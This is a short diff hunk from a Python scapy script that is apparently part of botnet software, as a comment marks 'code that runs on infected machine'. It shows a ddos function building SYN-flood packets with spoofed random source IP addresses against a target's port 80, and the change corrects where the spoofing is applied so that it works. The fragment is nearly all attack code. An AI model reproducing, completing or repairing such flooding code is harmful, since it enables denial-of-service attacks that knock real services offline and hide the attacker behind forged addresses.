@@ -14,8 +14,8 @@ from scapy.all import *
 
 # CODE THAT RUNS ON INFECTED MACHINE WILL GO HERE
 def ddos(target_IP):
-    tcp = TCP(sport=RandShort(), src=RandIP(), dport=80, flags="S")
-    ip = IP(dst=target_IP)
+    tcp = TCP(sport=RandShort(), dport=80, flags="S")
+    ip = IP(dst=target_IP, src=RandIP())
 
 
     raw = Raw(b"X"*1024)
